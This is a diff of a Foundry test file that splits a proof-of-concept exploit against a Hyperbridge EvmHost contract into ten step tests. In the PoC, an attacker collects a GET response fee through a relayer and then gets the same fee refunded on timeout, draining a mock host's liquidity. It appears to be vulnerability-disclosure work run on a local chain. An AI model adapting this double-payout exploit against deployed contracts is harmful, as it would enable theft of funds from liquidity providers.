@@ -27,12 +27,56 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
     uint256 internal constant TIMEOUT_RELAYER_KEY = 0xCAFE;
     uint256 internal constant UNRELATED_LIQUIDITY_PROVIDER_KEY = 0xFEED;
 
+    function testStep01_CreateAttackerWallets() public {
+        _runExploitFlowUntil(1);
+    }
+
+    function testStep02_DeployAttackerApp() public {
+        _runExploitFlowUntil(2);
+    }
+
+    function testStep03_MintMockTokens() public {
+        _runExploitFlowUntil(3);
+    }
+
+    function testStep04_FundAttackerApp() public {
+        _runExploitFlowUntil(4);
+    }
+
+    function testStep05_DispatchGetRequest() public {
+        _runExploitFlowUntil(5);
+    }
+
+    function testStep06_HandleGetResponseRelayerPaid() public {
+        _runExploitFlowUntil(6);
+    }
+
+    function testStep07_FundHostWithUnrelatedLiquidity() public {
+        _runExploitFlowUntil(7);
+    }
+
+    function testStep08_HandleTimeoutRefund() public {
+        _runExploitFlowUntil(8);
+    }
+
+    function testStep09_SweepRefundToAttackerWallet() public {
+        _runExploitFlowUntil(9);
+    }
+
+    function testStep10_FinalBalances() public {
+        _runExploitFlowUntil(10);
+    }
+
     function testPoC_GetResponseThenTimeoutPaysAndRefundsSameFee() public {
+        _runExploitFlowUntil(10);
+    }
+
+    function _runExploitFlowUntil(uint256 stopAfterStep) internal {
         console2.log("=== Hyperbridge EVM GET response -> timeout fee drain PoC ===");
-        console2.log("Foundry created a local EVM test chain for this run.");
+        console2.log("Foundry creates a fresh local EVM chain for this test command.");
+        console2.log("This step test replays prerequisites internally, then stops at the requested step.");
 
         uint256 fee = 10 ether;
-
         address attackerPayer = vm.addr(ATTACKER_PAYER_KEY);
         address responseRelayer = vm.addr(ATTACKER_RELAYER_KEY);
         address timeoutRelayer = vm.addr(TIMEOUT_RELAYER_KEY);
@@ -43,42 +87,45 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
         vm.deal(timeoutRelayer, 100 ether);
         vm.deal(liquidityProvider, 100 ether);
 
-        console2.log("Step 1: Foundry creates attacker payer wallet");
+        console2.log("Step 1: Foundry creates attacker-controlled wallets");
         console2.log("attacker payer private key:", ATTACKER_PAYER_KEY);
         console2.log("attacker payer wallet:", attackerPayer);
-
-        console2.log("Step 2: Foundry creates attacker response relayer wallet");
         console2.log("attacker response relayer private key:", ATTACKER_RELAYER_KEY);
         console2.log("attacker response relayer wallet:", responseRelayer);
-
-        console2.log("Step 3: Foundry creates unrelated liquidity provider wallet");
+        console2.log("timeout relayer private key:", TIMEOUT_RELAYER_KEY);
+        console2.log("timeout relayer wallet:", timeoutRelayer);
         console2.log("unrelated liquidity provider private key:", UNRELATED_LIQUIDITY_PROVIDER_KEY);
         console2.log("unrelated liquidity provider wallet:", liquidityProvider);
+        if (stopAfterStep == 1) return;
 
-        console2.log("Step 3.5: attacker deploys attacker app contract");
+        console2.log("Step 2: attacker deploys attacker app contract on local chain");
         vm.prank(attackerPayer);
         AttackerGetApp app = new AttackerGetApp(attackerPayer, address(host));
         console2.log("attacker app contract:", address(app));
         console2.log("mock EvmHost contract:", address(host));
         console2.log("mock fee token contract:", address(feeToken));
+        if (stopAfterStep == 2) return;
 
-        console2.log("Step 4: mint mock fee tokens to attacker payer wallet");
+        console2.log("Step 3: mock fee tokens are minted to attacker payer wallet");
         feeToken.mint(attackerPayer, fee);
         console2.log("attacker payer token balance after mint:", feeToken.balanceOf(attackerPayer));
-        console2.log("attacker relayer token balance after mint:", feeToken.balanceOf(responseRelayer));
+        console2.log("attacker response relayer token balance after mint:", feeToken.balanceOf(responseRelayer));
         console2.log("attacker app token balance after mint:", feeToken.balanceOf(address(app)));
         console2.log("mock host token balance after mint:", feeToken.balanceOf(address(host)));
 
-        uint256 attackerEoaCombinedBeforeFunding =
+        uint256 attackerEoaCombinedBeforeExploit =
             feeToken.balanceOf(attackerPayer) + feeToken.balanceOf(responseRelayer);
-        console2.log("attacker EOA combined before app funding:", attackerEoaCombinedBeforeFunding);
+        console2.log("attacker EOA combined before exploit:", attackerEoaCombinedBeforeExploit);
+        if (stopAfterStep == 3) return;
 
-        console2.log("Step 5: attacker payer wallet funds attacker app contract");
+        console2.log("Step 4: attacker payer wallet funds attacker app contract");
         vm.prank(attackerPayer);
         feeToken.transfer(address(app), fee);
-
         console2.log("attacker payer token balance after app funding:", feeToken.balanceOf(attackerPayer));
         console2.log("attacker app token balance after app funding:", feeToken.balanceOf(address(app)));
+        console2.log("attacker response relayer token balance after app funding:", feeToken.balanceOf(responseRelayer));
+        console2.log("mock host token balance after app funding:", feeToken.balanceOf(address(host)));
+        if (stopAfterStep == 4) return;
 
         bytes[] memory keys = new bytes[](1);
         keys[0] = hex"abcd";
@@ -94,7 +141,7 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
             payer: address(app)
         });
 
-        console2.log("Step 6: attacker app dispatches GET request with fee");
+        console2.log("Step 5: attacker app dispatches GET request with fee");
         vm.prank(attackerPayer);
         bytes32 commitment = app.dispatchGet(get);
 
@@ -117,12 +164,13 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
         console2.log("attacker app balance after GET dispatch:", feeToken.balanceOf(address(app)));
         console2.log("mock host balance after GET dispatch:", feeToken.balanceOf(address(host)));
         console2.log("stored request fee after GET dispatch:", host.requestCommitments(commitment).fee);
+        if (stopAfterStep == 5) return;
 
         StorageValue[] memory values = new StorageValue[](1);
         values[0] = StorageValue({key: keys[0], value: hex"01"});
         GetResponse memory response = GetResponse({request: request, values: values});
 
-        console2.log("Step 7: protocol handler accepts GET response; attacker relayer receives fee");
+        console2.log("Step 6: protocol handler accepts GET response; attacker relayer receives fee");
         vm.prank(host.hostParams().handler);
         host.dispatchIncoming(response, responseRelayer);
 
@@ -138,26 +186,29 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
         uint256 attackerCombinedAfterResponse =
             feeToken.balanceOf(attackerPayer) + feeToken.balanceOf(responseRelayer);
         console2.log("attacker EOA combined after response:", attackerCombinedAfterResponse);
+        if (stopAfterStep == 6) return;
 
-        console2.log("Step 8: unrelated liquidity provider funds mock host");
+        console2.log("Step 7: unrelated liquidity provider funds mock host");
         feeToken.mint(liquidityProvider, fee);
         console2.log("liquidity provider balance before transfer to host:", feeToken.balanceOf(liquidityProvider));
         vm.prank(liquidityProvider);
         feeToken.transfer(address(host), fee);
         console2.log("liquidity provider balance after transfer to host:", feeToken.balanceOf(liquidityProvider));
         console2.log("mock host unrelated liquidity before timeout:", feeToken.balanceOf(address(host)));
+        if (stopAfterStep == 7) return;
 
         FeeMetadata memory meta = host.requestCommitments(commitment);
 
-        console2.log("Step 9: protocol handler accepts timeout for same GET request");
+        console2.log("Step 8: protocol handler accepts timeout for same GET request");
         vm.prank(host.hostParams().handler);
         host.dispatchTimeOut(GetRequestTimeout({request: request, relayer: timeoutRelayer}), meta, commitment);
 
         console2.log("attacker app balance after timeout refund:", feeToken.balanceOf(address(app)));
         console2.log("mock host balance after timeout refund:", feeToken.balanceOf(address(host)));
         console2.log("attacker response relayer still paid:", feeToken.balanceOf(responseRelayer));
+        if (stopAfterStep == 8) return;
 
-        console2.log("Step 10: attacker payer wallet sweeps refunded tokens from attacker app");
+        console2.log("Step 9: attacker payer wallet sweeps refunded tokens from attacker app");
         vm.prank(attackerPayer);
         app.sweepFeeToken(attackerPayer);
 
@@ -166,22 +217,33 @@ contract EvmHostGetResponseTimeoutPoC is BaseTest {
         console2.log("attacker relayer wallet balance after sweep:", feeToken.balanceOf(responseRelayer));
         console2.log("mock host final balance:", feeToken.balanceOf(address(host)));
         console2.log("liquidity provider final balance:", feeToken.balanceOf(liquidityProvider));
+        if (stopAfterStep == 9) return;
 
+        console2.log("Step 10: final balance verification");
         uint256 attackerEoaCombinedAfter =
             feeToken.balanceOf(attackerPayer) + feeToken.balanceOf(responseRelayer);
 
-        console2.log("attacker EOA combined before exploit:", attackerEoaCombinedBeforeFunding);
+        console2.log("attacker EOA combined before exploit:", attackerEoaCombinedBeforeExploit);
         console2.log("attacker EOA combined after exploit:", attackerEoaCombinedAfter);
-        console2.log("attacker EOA net gain from mock host liquidity:", attackerEoaCombinedAfter - attackerEoaCombinedBeforeFunding);
+        console2.log(
+            "attacker EOA net gain from mock host liquidity:",
+            attackerEoaCombinedAfter - attackerEoaCombinedBeforeExploit
+        );
 
-        assertEq(attackerEoaCombinedBeforeFunding, fee, "attacker EOAs start with one fee amount");
+        assertEq(attackerEoaCombinedBeforeExploit, fee, "attacker EOAs start with one fee amount");
         assertEq(attackerEoaCombinedAfter, fee * 2, "attacker EOAs end with two fee amounts");
-        assertEq(attackerEoaCombinedAfter - attackerEoaCombinedBeforeFunding, fee, "attacker gains one fee from host liquidity");
+        assertEq(
+            attackerEoaCombinedAfter - attackerEoaCombinedBeforeExploit,
+            fee,
+            "attacker gains one fee from host liquidity"
+        );
         assertEq(feeToken.balanceOf(address(app)), 0, "attacker app swept to attacker EOA");
         assertEq(feeToken.balanceOf(address(host)), 0, "host liquidity drained by refund");
         assertEq(host.requestCommitments(commitment).sender, address(0), "timeout finally clears stale commitment");
 
-        console2.log("RESULT: mock fee tokens moved from mock EvmHost liquidity to attacker-controlled EOA wallets");
+        console2.log(
+            "RESULT: mock fee tokens moved from mock EvmHost liquidity to attacker-controlled EOA wallets"
+        );
         console2.log("RESULT: attacker EOA combined balance increased from 10 tokens to 20 tokens");
     }
 }
